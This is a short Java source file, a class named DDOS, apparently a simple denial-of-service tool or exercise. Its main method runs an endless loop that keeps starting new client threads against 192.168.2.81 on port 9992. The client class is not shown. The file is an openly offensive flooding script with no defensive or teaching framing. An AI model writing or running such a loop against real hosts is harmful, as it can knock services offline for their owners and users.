
public class DDOS {

	/**
	 * @param args
	 */
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		//(new Thread(new HiloServidor())).start();
		while(true)
		{
			(new Thread(new HiloCliente("192.168.2.81",9992))).start();
			
		}
	}

}
